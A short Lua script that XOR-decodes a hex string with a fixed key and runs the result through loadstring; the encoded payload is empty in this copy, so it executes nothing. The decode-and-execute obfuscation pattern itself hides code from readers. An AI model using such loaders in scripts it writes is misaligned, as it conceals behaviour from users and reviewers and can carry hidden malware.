local k={75,249,75,74,32,216,163,201,191,144,26,73,104,136,188,52,1,215,220,139,35,102,126,253,45,171,83,240,115,255,8,239}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
fn()
